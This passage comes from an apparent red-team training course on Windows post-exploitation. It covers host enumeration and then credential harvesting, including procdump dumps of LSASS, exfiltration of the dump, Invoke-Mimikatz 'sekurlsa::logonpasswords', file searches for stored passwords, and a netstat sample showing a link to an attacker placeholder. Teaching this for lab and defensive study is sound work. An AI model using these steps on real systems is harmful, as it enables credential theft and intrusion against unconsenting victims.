Manufacturer:           Microsoft Corporation\nOS Configuration:          Member Workstation\nOS Build Type:             Multiprocessor Free\nRegistered Owner:          User\nRegistered Organization:   LAB\nProduct ID:                00000-00000-00000-AA000\nOriginal Install Date:     7/15/2023, 11:30:00 AM\nSystem Boot Time:          7/15/2023, 2:00:00 PM\nSystem Manufacturer:       VMware, Inc.\nSystem Model:              VMware Virtual Platform\nSystem Type:               x64-based PC\nProcessor(s):              1 Processor(s) Installed.\n                           [01]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~2592 Mhz\nBIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1907100924, 7/10/2019\nWindows Directory:         C:\\WINDOWS\nSystem Directory:          C:\\WINDOWS\\system32\nBoot Device:               \\Device\\HarddiskVolume1\nSystem Locale:             en-us;English (United States)\nInput Locale:              en-us;English (United States)\nTime Zone:                 (UTC-05:00) Eastern Time (US &amp; Canada)\nTotal Physical Memory:     4,095 MB\nAvailable Physical Memory: 2,500 MB\nVirtual Memory: Max Size:  8,191 MB\nVirtual Memory: Available: 6,300 MB\nVirtual Memory: In Use:    1,891 MB\nPage File Location(s):     C:\\pagefile.sys\nDomain:                    LAB.LOCAL\nLogon Server:              \\\\DC01.LAB.LOCAL\nHotfix(s):                 8 Hotfix(s) Installed.\n                           [01]: KB456xxxxx\n                           [02]: KB457xxxxx\n                           ...\nNetwork Card(s):           1 Card(s) Installed.\n                           [01]: Intel(R) 82574L Gigabit Network Connection\n                                 Connection Name: Ethernet0\n                                 DHCP Enabled:    Yes\n                                 IP address(es)\n                                 [01]: 192.168.1.150\n</code></pre>\n<h4><strong>Using Registry Queries</strong></h4>\n<p>The Windows Registry is a central database for configuration. You can extract OS version information directly from here.</p>\n<pre><code class=\"language-cmd\">reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot; /v ProductName\nreg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot; /v CurrentBuild\nreg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot; /v CurrentMajorVersionNumber\nreg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot; /v CurrentMinorVersionNumber\n</code></pre>\n<p><strong>Explanation:</strong></p>\n<ul>\n<li><code>reg query</code>: The command to query the registry.</li>\n<li><code>&quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot;</code>: The key path containing OS version info.</li>\n<li><code>/v ProductName</code>: Specifies the value name (e.g., &quot;Windows 10 Enterprise&quot;).</li>\n<li><code>/v CurrentBuild</code>: Specifies the build number (e.g., &quot;19044&quot;).</li>\n<li><code>/v CurrentMajorVersionNumber</code>, <code>/v CurrentMinorVersionNumber</code>: More specific version numbers.</li>\n</ul>\n<p><strong>Why use Registry?</strong> It&#39;s another way to get the info, sometimes useful if <code>systeminfo</code> is blocked or for scripting. It also introduces interacting with the registry, which is vital for other post-exploitation tasks (like persistence).</p>\n<h3><strong>1.6 Enumerating Users, Groups, and Sessions</strong></h3>\n<p>Who uses this machine? What are their privileges? Who is currently logged in?</p>\n<h4><strong>Using <code>whoami</code> (CMD)</strong></h4>\n<p>Simple, but essential first step. Tells you the user and domain/hostname you are currently operating as.</p>\n<pre><code class=\"language-cmd\">whoami\n</code></pre>\n<p><strong>Output:</strong></p>\n<pre><code>lab\\user1\n</code></pre>\n<p>or</p>\n<pre><code>target-pc\\administrator\n</code></pre>\n<p>This immediately tells you if you are a local user or a domain user, and your username.</p>\n<h4><strong>Using <code>query user</code> (CMD)</strong></h4>\n<p>Lists users currently logged into the system (primarily via RDP or console session).</p>\n<pre><code class=\"language-cmd\">query user\n</code></pre>\n<p><strong>Output Example:</strong></p>\n<pre><code> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\n&gt;user1                 rdp-tcp#0           0  Active          3  7/15/2023 2:05 PM\n administrator         console             1  Active         none  7/15/2023 1:55 PM\n</code></pre>\n<p><strong>What to look for:</strong></p>\n<ul>\n<li><strong>USERNAME:</strong> Other users logged in. Are any of them administrators? Domain Admins?</li>\n<li><strong>SESSIONNAME:</strong> Type of session (console, rdp-tcp).</li>\n<li><strong>STATE:</strong> Active, Disconnected. Active sessions might be hijackable later (advanced topic).</li>\n<li><strong>IDLE TIME:</strong> How long has the session been idle?</li>\n</ul>\n<p><strong>Why is this important?</strong> Identifying other active users, especially privileged ones, is a key step for potential credential harvesting or session hijacking (M2, M4).</p>\n<h4><strong>Using <code>net user</code> (CMD)</strong></h4>\n<p>Enumerates local users on the machine.</p>\n<pre><code class=\"language-cmd\">net user\n</code></pre>\n<p><strong>Output Example:</strong></p>\n<pre><code>User accounts for \\\\TARGET-PC\n\n-------------------------------------------------------------------------------\nAdministrator           Guest                   user1\nWDAGUtilityAccount      DefaultAccount\nThe command completed successfully.\n</code></pre>\n<p>To get details about a specific user:</p>\n<pre><code class=\"language-cmd\">net user &lt;username&gt;\n</code></pre>\n<p><strong>Example:</strong></p>\n<pre><code class=\"language-cmd\">net user administrator\n</code></pre>\n<p><strong>Output Snippet (for Administrator user):</strong></p>\n<pre><code>User name                     Administrator\nFull Name\nComment                       Built-in account for administering the computer/domain\n...\nAccount active                Yes\nAccount expires               Never\nPassword last set             7/10/2023 10:00:00 AM\nPassword expires              Never\nPassword changeable           7/10/2023 10:00:00 AM\n...\nLocal Group Memberships       *Administrators\nGlobal Group memberships      *None\n...\n</code></pre>\n<p><strong>What to look for:</strong></p>\n<ul>\n<li>List of users: Identify potential targets.</li>\n<li>Details of specific users: When was the password last set? Is the account active? What groups do they belong to? (Local Group Memberships is key here).</li>\n</ul>\n<p><strong>Why is this important?</strong> You need to know which accounts exist locally. Identifying local administrators is critical for privilege escalation.</p>\n<h4><strong>Using <code>net localgroup</code> (CMD)</strong></h4>\n<p>Enumerates local groups and their members.</p>\n<pre><code class=\"language-cmd\">net localgroup\n</code></pre>\n<p><strong>Output Example:</strong></p>\n<pre><code>Aliases for \\\\TARGET-PC\n\n-------------------------------------------------------------------------------\n*Administrators\n*Backup Operators\n*Guests\n*Remote Desktop Users\n*Users\n...\nThe command completed successfully.\n</code></pre>\n<p>To see members of a specific group (most importantly, <code>Administrators</code>):</p>\n<pre><code class=\"language-cmd\">net localgroup administrators\n</code></pre>\n<p><strong>Output Example:</strong></p>\n<pre><code>Alias name     Administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nLAB\\Domain Admins\nuser1\nThe command completed successfully.\n</code></pre>\n<p><strong>What to look for:</strong></p>\n<ul>\n<li>Which accounts are members of the <code>Administrators</code> group? This is your primary target for local privilege escalation.</li>\n<li>Which accounts are in <code>Remote Desktop Users</code>? They can RDP in.</li>\n<li>Other interesting groups like <code>Backup Operators</code> (can read many files), <code>Remote Management Users</code>, etc.</li>\n</ul>\n<p><strong>Why is this important?</strong> Explicitly identifies which users or groups have administrative privileges on this specific machine. Knowing <code>LAB\\Domain Admins</code> is a member of the local <code>Administrators</code> group on this workstation is a <em>huge</em> finding for lateral movement towards domain dominance.</p>\n<h4><strong>Using PowerShell for Users and Groups (More Detail)</strong></h4>\n<p>PowerShell cmdlets often provide more structured and detailed output.</p>\n<pre><code class=\"language-powershell\">Get-LocalUser\nGet-LocalGroup\nGet-LocalGroupMember -Group &quot;Administrators&quot;\n</code></pre>\n<p>These cmdlets are available on newer Windows versions (Windows 10, Server 2016+). For older versions or domain users/groups (which we&#39;ll cover in Module 5), you&#39;d use WMI or the ActiveDirectory module.</p>\n<p><strong>Example using <code>Get-LocalGroupMember</code>:</strong></p>\n<pre><code class=\"language-powershell\">Get-LocalGroupMember -Group &quot;Administrators&quot; | Select-Object Name, PrincipalSource\n</code></pre>\n<p><strong>Output Example:</strong></p>\n<pre><code>Name                 PrincipalSource\n----                 ---------------\nTARGET-PC\\Administrator Local\nLAB\\Domain Admins    ActiveDirectory\nTARGET-PC\\user1      Local\n</code></pre>\n<p><strong>Why use PowerShell?</strong> The output is object-based, making it much easier to filter, sort, and export data for scripting and automation. <code>PrincipalSource</code> clearly tells you if the member is a local account or a domain account.</p>\n<h3><strong>1.7 Identifying Running Processes and Services</strong></h3>\n<p>What software is running? Are there any security products? Any unusual processes?</p>\n<h4><strong>Using <code>tasklist</code> (CMD)</strong></h4>\n<p>Lists currently running processes.</p>\n<pre><code class=\"language-cmd\">tasklist\n</code></pre>\n<p><strong>Output Snippet:</strong></p>\n<pre><code>Image Name                     PID Session Name        Session#    Mem Usage\n========================= ======== ================ =========== ============\nSystem Idle Process              0 Services                   0         8 KB\nSystem                           4 Services                   0       184 KB\n...\nmsmpeng.exe                   1234 Services                   0     150,000 KB  &lt;-- Windows Defender\nSearchIndexer.exe             5678 Services                   0      50,000 KB\n...\ncmd.exe                       9876 rdp-tcp#0                  0       3,000 KB  &lt;-- Your command prompt!\npowershell.exe               10112 rdp-tcp#0                  0     100,000 KB\n...\n</code></pre>\n<p>To see services hosted within processes:</p>\n<pre><code class=\"language-cmd\">tasklist /svc\n</code></pre>\n<p>To see process details including the full path:</p>\n<pre><code class=\"language-cmd\">tasklist /v\n</code></pre>\n<p><strong>What to look for:</strong></p>\n<ul>\n<li><strong>Security Software:</strong> Processes like <code>msmpeng.exe</code> (Windows Defender), <code>sophos*.exe</code>, <code>McAfee*.exe</code>, <code>agent.exe</code> (endpoint agents). Knowing what security is running helps plan evasion.</li>\n<li><strong>Unusual Processes:</strong> Anything with a strange name, running from a weird directory (<code>C:\\Users\\Public\\temp\\malware.exe</code>), or consuming excessive resources.</li>\n<li><strong>Processes running as SYSTEM:</strong> These are high-privilege processes.</li>\n<li><strong>Processes with network connections:</strong> Cross-reference with <code>netstat</code> output.</li>\n</ul>\n<p><strong>Why is this important?</strong> Helps identify security controls, potential targets for injection or manipulation, and reveals what the user or system is actively doing.</p>\n<h4><strong>Using <code>Get-Process</code> (PowerShell)</strong></h4>\n<p>Provides more detailed information about processes.</p>\n<pre><code class=\"language-powershell\">Get-Process\n</code></pre>\n<p><strong>Example:</strong> Get details for a specific process name:</p>\n<pre><code class=\"language-powershell\">Get-Process -Name &quot;explorer&quot;\n</code></pre>\n<p><strong>Example:</strong> Get processes owned by a specific user (requires admin privileges usually):</p>\n<pre><code class=\"language-powershell\">Get-Process | Where-Object { $_.Owner -eq &quot;LAB\\user1&quot; }\n</code></pre>\n<p><strong>Example:</strong> Get processes and their full path:</p>\n<pre><code class=\"language-powershell\">Get-Process | Select-Object ProcessName, Path\n</code></pre>\n<p><strong>Why use PowerShell?</strong> Object-based output allows for powerful filtering and analysis. You can easily find processes based on owner, path, CPU usage, etc.</p>\n<h4><strong>Using <code>Get-Service</code> (PowerShell)</strong></h4>\n<p>Lists installed services and their status.</p>\n<pre><code class=\"language-powershell\">Get-Service\n</code></pre>\n<p><strong>Example:</strong> List only running services:</p>\n<pre><code class=\"language-powershell\">Get-Service | Where-Object { $_.Status -eq &quot;Running&quot; }\n</code></pre>\n<p><strong>Example:</strong> Get details for a specific service:</p>\n<pre><code class=\"language-powershell\">Get-Service -Name &quot;Spooler&quot; # The Print Spooler service, often targeted\n</code></pre>\n<p><strong>What to look for:</strong></p>\n<ul>\n<li><strong>Running Services:</strong> What functionality is enabled?</li>\n<li><strong>Disabled Services:</strong> Are any critical security services disabled?</li>\n<li><strong>Services running as SYSTEM or specific users:</strong> Potential targets for privilege escalation if misconfigured (covered in M3).</li>\n<li><strong>Unusual Service Names:</strong> Could indicate malware or custom applications.</li>\n</ul>\n<p><strong>Why is this important?</strong> Services are often long-running processes that start at boot. Misconfigured services are a classic privilege escalation vector. Identifying security services helps understand defenses.</p>\n<h3><strong>1.8 Mapping Network Connections and Configuration</strong></h3>\n<p>How is this machine connected? What other machines is it talking to?</p>\n<h4><strong>Using <code>ipconfig</code> (CMD)</strong></h4>\n<p>Displays current TCP/IP network configuration values.</p>\n<pre><code class=\"language-cmd\">ipconfig /all\n</code></pre>\n<p><strong>Output Snippet:</strong></p>\n<pre><code>Windows IP Configuration\n\n   Host Name . . . . . . . . . . . . : TARGET-PC\n   Primary Dns Suffix  . . . . . . . : lab.local\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n   WINS Proxy Enabled. . . . . . . . : No\n   DNS Suffix Search List. . . . . . : lab.local\n\nEthernet adapter Ethernet0:\n\n   Connection-specific DNS Suffix  . :\n   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection\n   Physical Address. . . . . . . . . : 00-50-56-XX-YY-ZZ\n   DHCP Enabled. . . . . . . . . . . : Yes\n   Autoconfiguration Enabled . . . . : Yes\n   IPv4 Address. . . . . . . . . . . : 192.168.1.150(Preferred)\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Lease Obtained. . . . . . . . . . : Monday, July 15, 2023 2:00:00 PM\n   Lease Expires . . . . . . . . . . : Tuesday, July 16, 2023 2:00:00 PM\n   Default Gateway . . . . . . . . . : 192.168.1.1\n   DHCP Server . . . . . . . . . . . : 192.168.1.1\n   DNS Servers . . . . . . . . . . . : 192.168.1.10  &lt;-- Often the Domain Controller!\n                                       8.8.8.8\n   NetBIOS over Tcpip. . . . . . . . : Enabled\n</code></pre>\n<p><strong>What to look for:</strong></p>\n<ul>\n<li><strong>IP Address(es):</strong> What network segment are you on? Can you reach other segments?</li>\n<li><strong>Subnet Mask:</strong> Helps define the local network.</li>\n<li><strong>Default Gateway:</strong> The router. Often the first hop to other networks.</li>\n<li><strong>DNS Servers:</strong> <strong>Crucial!</strong> In a domain, the primary DNS server is almost always a Domain Controller. This immediately tells you the IP address of a DC.</li>\n<li><strong>Domain Name:</strong> Confirms the domain from <code>systeminfo</code>.</li>\n</ul>\n<p><strong>Why is this important?</strong> Understanding the network configuration is fundamental for planning lateral movement. Identifying the DC via DNS server listing is a primary way to locate domain infrastructure.</p>\n<h4><strong>Using <code>netstat</code> (CMD)</strong></h4>\n<p>Displays active TCP connections, ports on which the computer is listening, Ethernet statistics, the IP routing table, and IPv6 statistics.</p>\n<pre><code class=\"language-cmd\">netstat -ano\n</code></pre>\n<p><strong>Explanation of flags:</strong></p>\n<ul>\n<li><code>-a</code>: Displays all active TCP connections and the TCP and UDP ports on which the computer is listening.</li>\n<li><code>-n</code>: Displays active TCP connections, however, addresses and port numbers are expressed numerically and no attempt is made to determine names. Much faster.</li>\n<li><code>-o</code>: Displays active TCP connections and includes the process ID (PID) for each connection. This is <em>very</em> useful.</li>\n</ul>\n<p><strong>Output Snippet:</strong></p>\n<pre><code>Active Connections\n\n  Proto  Local Address          Foreign Address        State           PID\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       848   &lt;-- RPC Endpoint Mapper\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4     &lt;-- SMB (File Sharing)\n  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1236  &lt;-- RDP\n  TCP    192.168.1.150:49870    192.168.1.1:53         ESTABLISHED     1152  &lt;-- DNS query to gateway/DC\n  TCP    192.168.1.150:49871    192.168.1.10:389       ESTABLISHED     9988  &lt;-- LDAP query to DC (192.168.1.10)\n  TCP    192.168.1.150:49872    192.168.1.200:445      ESTABLISHED     4     &lt;-- SMB connection to another host (192.168.1.200)\n  TCP    192.168.1.150:50000    YOUR_ATTACKER_IP:4444\n</code></pre>\n\n                </div>\n             </div>\n         ",
    "module-2": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 2: module_2</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright, team! Welcome back to the deep dive. Module 1 got our feet wet, establishing a basic foothold and getting our bearings on a target Windows host using native tools. We learned <em>how</em> to look around.</p>\n<p>Now, in Module 2, we shift gears. We&#39;re not just looking around passively anymore; we&#39;re actively searching for the <em>good stuff</em>. This means digging deeper into the local system to find valuable information, uncovering potential weaknesses we might exploit later (hello, Module 3!), and, perhaps most importantly, finding those precious credentials that can unlock doors to other systems or higher privileges.</p>\n<p>This is where the post-exploitation phase really starts to pay dividends. Local enumeration gives us context and potential attack vectors, and credential harvesting often provides the keys to the kingdom, or at least the keys to the next room.</p>\n<p>Let&#39;s get our hands dirty!</p>\n<hr>\n<p><strong>Module 2: Local Enumeration &amp; Credential Harvesting</strong></p>\n<p><strong>Module Objective:</strong> Identify valuable local information, uncover potential weaknesses, and extract cached or stored credentials from a compromised Windows host.</p>\n<p>By the end of this module, you will be able to systematically enumerate a Windows host for sensitive files, installed software, system configurations, and critical credential storage locations. You will understand the <em>why</em> behind targeting LSASS and registry hives, and perform practical steps (in a lab!) to extract credentials, setting the stage for privilege escalation and lateral movement.</p>\n<hr>\n<h3><strong>2.1: The Post-Exploitation Mindset: Digging Deeper</strong></h3>\n<p>In Module 1, we were like tourists getting off the plane – looking at the major landmarks (<code>systeminfo</code>, <code>ipconfig</code>, <code>net user</code>). Now, we&#39;re residents exploring the hidden alleys, checking basements, and looking under floorboards.</p>\n<p>Our goals in this deeper phase are:</p>\n<ol>\n<li><strong>Gain Context:</strong> Understand the <em>specific</em> role of this machine. Is it a user workstation? A server? What applications run here? Who uses it?</li>\n<li><strong>Find Local Weaknesses:</strong> Identify misconfigurations or vulnerabilities unique to <em>this</em> host that could allow us to elevate privileges locally (more on this in M3).</li>\n<li><strong>Discover Sensitive Data:</strong> Locate files containing passwords, API keys, configuration strings, sensitive documents, etc.</li>\n<li><strong>Harvest Credentials:</strong> Extract cached passwords, hashes, or Kerberos tickets stored in memory or on disk. <strong>This is often the fastest way to move forward.</strong></li>\n</ol>\n<p>We&#39;ll still rely heavily on our command-line friends (CMD and PowerShell), but we&#39;ll also introduce the <em>types</em> of specialized tools used by red teamers and attackers (and defenders!) to automate and facilitate these tasks.</p>\n<h3><strong>2.2: In-Depth Local File System Enumeration</strong></h3>\n<p>The file system is a treasure trove. Users save things where they shouldn&#39;t, applications store configurations insecurely, and scripts might contain hardcoded credentials. Our job is to search intelligently.</p>\n<p><strong>Why Search the File System?</strong></p>\n<ul>\n<li><strong>Configuration Files:</strong> Applications (databases, web servers, custom tools) often store connection strings, API keys, or passwords in XML, INI, CONFIG, or TXT files.</li>\n<li><strong>Scripts:</strong> PowerShell (.ps1), Batch (.bat, .cmd), Python (.py), etc., scripts might contain hardcoded credentials for automation purposes.</li>\n<li><strong>User Profiles:</strong> Desktop, Documents, Downloads, AppData directories often contain cached files, browser history, saved RDP connection files, password manager databases (though hopefully encrypted!), and other sensitive user data.</li>\n<li><strong>Application Data:</strong> Specific application folders (e.g., <code>C:\\Program Files</code>, <code>C:\\Program Files (x86)</code>) might contain configuration files or logs of interest.</li>\n<li><strong>Temporary Directories:</strong> Sometimes sensitive data or temporary credential files are left behind in <code>%TEMP%</code>.</li>\n</ul>\n<p><strong>Techniques &amp; Commands:</strong></p>\n<p>We&#39;ll primarily use PowerShell for its power and flexibility in navigating and searching the file system.</p>\n<ul>\n<li><p><strong>Basic Directory Listing (Recurse):</strong></p>\n<pre><code class=\"language-powershell\">Get-ChildItem -Path C:\\Users -Recurse -ErrorAction SilentlyContinue\n</code></pre>\n<ul>\n<li><code>Get-ChildItem</code>: Equivalent of <code>dir</code>.</li>\n<li><code>-Path C:\\Users</code>: Specifies where to start. User profiles are critical.</li>\n<li><code>-Recurse</code>: Goes into subdirectories. Be aware this can be <em>very</em> slow and generate a lot of output on large file systems.</li>\n<li><code>-ErrorAction SilentlyContinue</code>: Suppresses errors for paths we don&#39;t have permission to access, keeping the output clean.</li>\n</ul>\n</li>\n<li><p><strong>Searching for Specific File Extensions:</strong> We can filter the recursive listing for files that commonly store credentials or configuration.</p>\n<pre><code class=\"language-powershell\">Get-ChildItem -Path C:\\ -Recurse -Include *.config,*.xml,*.ini,*.txt,*.ps1,*.bat,*.cmd,*.py,*.kdbx,*.rdp -ErrorAction SilentlyContinue\n</code></pre>\n<ul>\n<li><code>-Include</code>: Specifies file patterns to include. Note: <code>-Include</code> <em>requires</em> <code>-Recurse</code> and a wildcard (<code>*</code>) in the <code>-Path</code> if searching the root, but the above is a common way to use it starting from a specific path like <code>C:\\</code>. A simpler way is to specify the path more broadly if needed, but the above is generally effective.</li>\n</ul>\n</li>\n<li><p><strong>Searching File Contents (Grepping):</strong> Once we find interesting files, or even across many files, we can search their <em>contents</em> for keywords. PowerShell&#39;s <code>Select-String</code> is powerful for this.</p>\n<pre><code class=\"language-powershell\"># Example 1: Search all .txt files in C:\\ for the word &quot;password&quot;\nGet-ChildItem -Path C:\\ -Recurse -Filter &quot;*.txt&quot; -ErrorAction SilentlyContinue | Select-String &quot;password&quot;\n\n# Example 2: Search specific config files found earlier for &quot;credential&quot; or &quot;pass&quot; (case-insensitive)\nGet-ChildItem -Path C:\\Users\\SpecificUser\\AppData\\Roaming\\MyApp\\config.xml, C:\\Program Files\\AnotherApp\\settings.ini | Select-String -Pattern &quot;credential&quot;, &quot;pass&quot; -IgnoreCase\n</code></pre>\n<ul>\n<li><code>Select-String</code>: Searches for text within files.</li>\n<li><code>-Pattern</code>: The keyword(s) to search for.</li>\n<li><code>-IgnoreCase</code>: Makes the search case-insensitive.</li>\n</ul>\n</li>\n<li><p><strong>Looking for RDP Files:</strong> Users often save RDP connection files with credentials.</p>\n<pre><code class=\"language-powershell\">Get-ChildItem -Path C:\\Users -Recurse -Include *.rdp -ErrorAction SilentlyContinue\n</code></pre>\n<p>If found, open the <code>.rdp</code> file in a text editor; sometimes credentials (or at least the username) are saved within them.</p>\n</li>\n<li><p><strong>Browser History/Saved Passwords:</strong> While direct extraction from running browsers is tricky and depends heavily on the browser version and security, knowing <em>where</em> browser profiles are stored is useful. Tools often target these locations.</p>\n<ul>\n<li>Chrome: <code>%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\</code></li>\n<li>Firefox: <code>%APPDATA%\\Mozilla\\Firefox\\Profiles\\</code></li>\n<li>Edge (Chromium): <code>%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\</code></li>\n</ul>\n</li>\n</ul>\n<p><strong>Practical Tip:</strong> Start broad (<code>Get-ChildItem -Recurse</code>), then filter (<code>-Include</code>), then search contents (<code>Select-String</code>). Be mindful of the potential volume of data. Target user profile directories first as they are most likely to contain user-specific sensitive data.</p>\n<h3><strong>2.3: Enumerating Installed Software and Patches</strong></h3>\n<p>Knowing what software is installed helps identify potential vulnerabilities, interesting applications (like password managers, VPN clients, admin tools), and missing security patches.</p>\n<p><strong>Why Enumerate Software/Patches?</strong></p>\n<ul>\n<li><strong>Vulnerability Identification:</strong> Older versions of software might have known public exploits (CVEs).</li>\n<li><strong>Finding Useful Tools:</strong> Discover applications that might contain credentials (e.g., Putty, WinSCP configuration files), or admin tools that could be leveraged.</li>\n<li><strong>Patch Level Assessment:</strong> Missing security patches can indicate system vulnerability, potentially to kernel exploits or other system-level attacks (Module 3!).</li>\n</ul>\n<p><strong>Techniques &amp; Commands:</strong></p>\n<ul>\n<li><p><strong>Using WMIC (Classic but can be slow):</strong></p>\n<pre><code class=\"language-cmd\">wmic product get name,version\n</code></pre>\n<ul>\n<li>This queries the Windows Installer provider. It&#39;s often slow and can sometimes even trigger re-configuration of installed software. Use with caution.</li>\n</ul>\n</li>\n<li><p><strong>Using PowerShell (More Recommended):</strong></p>\n<pre><code class=\"language-powershell\"># Get list of installed applications (generally faster than WMIC)\nGet-Package\n\n# Get list of installed Hotfixes/Patches\nGet-HotFix\n</code></pre>\n<ul>\n<li><code>Get-Package</code>: Works well on newer Windows versions (Windows 8/Server 2012 R2 and later). Provides name, version, and source.</li>\n<li><code>Get-HotFix</code>: Lists installed Windows updates/patches. Compare this list against known critical security updates to identify missing patches.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Practical Tip:</strong> Combine <code>Get-Package</code> and <code>Get-HotFix</code> output with vulnerability databases (like NVD) or security tools (though this course focuses on offensive techniques, awareness of defensive tools helps understand detection) to identify potential software-based attack vectors.</p>\n<h3><strong>2.4: Understanding Windows Credential Storage Locations</strong></h3>\n<p>This is the core of credential harvesting. Windows needs to store and manage credentials for users to log in, access resources, and run services. Understanding <em>where</em> it stores them is key to knowing <em>how</em> to steal them.</p>\n<p>Think of Windows as having several &quot;vaults&quot; for credentials:</p>\n<ol>\n<li><p><strong>LSASS (Local Security Authority Subsystem Service):</strong></p>\n<ul>\n<li>This is a critical Windows process (<code>lsass.exe</code>).</li>\n<li>It handles security policy, user authentication, and manages credentials for currently logged-on users and active system processes.</li>\n<li>It holds various credential representations in memory:<ul>\n<li><strong>Cleartext Passwords:</strong> Sometimes, if certain security policies are enabled or on older systems. <em>Highly valuable!</em></li>\n<li><strong>NTLM Hashes:</strong> Cryptographic hashes of user passwords (specifically, the NTLM hash).</li>\n<li><strong>Kerberos Tickets:</strong> Both Ticket Granting Tickets (TGTs) and Service Tickets (TGSs). These can be reused (Pass-the-Ticket).</li>\n<li><strong>LSA Secrets:</strong> System-level credentials used by services or the machine account.</li>\n</ul>\n</li>\n<li>Accessing LSASS memory requires high privileges (typically Administrator or SYSTEM).</li>\n</ul>\n</li>\n<li><p><strong>SAM and SECURITY Registry Hives:</strong></p>\n<ul>\n<li>These are files located at <code>C:\\Windows\\System32\\config\\SAM</code> and <code>C:\\Windows\\System32\\config\\SECURITY</code>.</li>\n<li><strong>SAM (Security Account Manager):</strong> Contains the local user accounts database, including their NTLM password hashes. This is for <em>local</em> accounts on that specific machine.</li>\n<li><strong>SECURITY:</strong> Contains the LSA Secrets, which can include cached domain controller credentials, service account passwords, and other system-level secrets.</li>\n<li>These files are locked while Windows is running normally. To access them, you need SYSTEM privileges and often need to access them <em>offline</em> or via a method that bypasses the file lock (like Volume Shadow Copy).</li>\n</ul>\n</li>\n<li><p><strong>Credential Manager:</strong></p>\n<ul>\n<li>This is a user-specific store (<code>%APPDATA%\\Microsoft\\Credentials</code> and <code>%LOCALAPPDATA%\\Microsoft\\Credentials</code>).</li>\n<li>Users can save credentials here for things like:<ul>\n<li>RDP connections</li>\n<li>Network shares</li>\n<li>Websites (less common now, browsers handle this)</li>\n<li>Specific applications</li>\n</ul>\n</li>\n<li>These credentials are encrypted using the user&#39;s login credentials as part of the key derivation. Accessing <em>another user&#39;s</em> Credential Manager requires SYSTEM privileges to decrypt their data.</li>\n</ul>\n</li>\n<li><p><strong>LSA Secrets (Older/Specific):</strong></p>\n<ul>\n<li>While some LSA Secrets are in the SECURITY hive, some might be accessible differently. These often relate to machine accounts, service accounts, or cached domain credentials.</li>\n</ul>\n</li>\n</ol>\n<p>Understanding these locations tells us <em>where</em> our tools need to look and <em>what privileges</em> are required for each method.</p>\n<h3><strong>2.5: Dumping LSASS Process Memory</strong></h3>\n<p>This is arguably the most common and often most fruitful method for harvesting credentials from a live system.</p>\n<p><strong>Why Dump LSASS?</strong> Because it holds the most <em>current</em> and <em>active</em> credential information, including sometimes cleartext passwords or easily reusable hashes/tickets.</p>\n<p><strong>Requirement:</strong> Administrator or SYSTEM privileges on the target machine.</p>\n<p><strong>Technique 1: Using <code>procdump</code> (Sysinternals)</strong></p>\n<p><code>procdump</code> is a legitimate Microsoft Sysinternals tool used by developers and administrators to troubleshoot application crashes by creating process dumps. We can repurpose it to dump the memory of <code>lsass.exe</code>.</p>\n<ul>\n<li><strong>Step 1: Obtain <code>procdump</code>:</strong> Download the Sysinternals suite or just <code>procdump.exe</code>. You&#39;ll need to get this executable onto the target machine (or run it remotely if you have that capability).</li>\n<li><strong>Step 2: Run <code>procdump</code> on <code>lsass.exe</code>:</strong><pre><code class=\"language-cmd\">procdump.exe -accepteula -ma lsass.exe lsass.dmp\n</code></pre>\n<ul>\n<li><code>-accepteula</code>: Automatically accepts the End-User License Agreement.</li>\n<li><code>-ma</code>: Writes a dump file with all process memory. This is crucial for capturing credentials.</li>\n<li><code>lsass.exe</code>: The target process name.</li>\n<li><code>lsass.dmp</code>: The output file name for the memory dump.</li>\n</ul>\n</li>\n<li><strong>Step 3: Exfiltrate the dump file:</strong> Copy <code>lsass.dmp</code> from the target machine back to your attacker machine.</li>\n<li><strong>Step 4: Analyze the dump file:</strong> Use a tool <em>on your attacker machine</em> to read the <code>lsass.dmp</code> file and extract credentials. The most famous tool for this is <strong>Mimikatz</strong>.</li>\n</ul>\n<p><strong>Technique 2: Using Mimikatz (Direct or via Loader)</strong></p>\n<p>Mimikatz, created by Benjamin Delpy (<code>@gentilkiwi</code>), is the <em>de facto</em> tool for Windows credential operations. It can interact directly with LSASS memory or analyze dump files. <em>However</em>, directly executing <code>mimikatz.exe</code> is <em>highly</em> likely to be detected and blocked by Antivirus (AV) and Endpoint Detection and Response (EDR) solutions.</p>\n<p>Attackers and red teamers use various methods to run Mimikatz functionality while avoiding detection, such as:</p>\n<ul>\n<li>Reflective DLL injection (running the Mimikatz DLL directly in memory).</li>\n<li>Loading it via PowerShell (e.g., <code>Invoke-Mimikatz</code> from PowerSploit).</li>\n<li>Using custom loaders or obfuscated versions.</li>\n</ul>\n<p>For the purpose of this module, we will focus on the <em>concept</em> and the <em>output</em> you&#39;d expect, and use <code>Invoke-Mimikatz</code> from PowerSploit in the lab exercise as a common method (while acknowledging it might require AV bypass in a real scenario, which is a topic for more advanced courses).</p>\n<ul>\n<li><p><strong>Conceptual Steps (using <code>Invoke-Mimikatz</code>):</strong></p>\n<ul>\n<li>Get the <code>Invoke-Mimikatz.ps1</code> script onto the target.</li>\n<li>Import the script: <code>Import-Module .\\Invoke-Mimikatz.ps1</code></li>\n<li>Run the relevant command: <code>Invoke-Mimikatz -Command &#39;&quot;sekurlsa::logonpasswords&quot;&#39;</code></li>\n<li>The output will appear directly in your PowerShell 